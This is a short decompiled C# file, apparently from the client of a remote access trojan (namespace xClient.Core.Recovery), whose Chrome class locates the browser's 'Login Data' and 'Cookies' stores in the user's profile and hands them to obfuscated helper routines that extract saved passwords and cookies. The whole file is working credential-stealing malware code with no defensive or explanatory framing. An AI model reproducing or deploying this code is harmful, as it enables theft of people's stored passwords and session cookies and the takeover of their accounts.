using System;
using System.Collections.Generic;
using System.IO;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000A6 RID: 166
	public class Chrome
	{
		// Token: 0x06000455 RID: 1109 RVA: 0x0000FFC0 File Offset: 0x0000E1C0
		public static List<GClass32> GetSavedPasswords()
		{
			List<GClass32> result;
			try
			{
				string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Login Data");
				result = GClass29.smethod_0(datapath, "Chrome");
			}
			catch (Exception)
			{
				result = new List<GClass32>();
			}
			return result;
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x00010008 File Offset: 0x0000E208
		public static List<GClass29.GClass30> GetSavedCookies()
		{
			List<GClass29.GClass30> result;
			try
			{
				string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Cookies");
				result = GClass29.smethod_1(dataPath, "Chrome");
			}
			catch (Exception)
			{
				result = new List<GClass29.GClass30>();
			}
			return result;
		}
	}
}
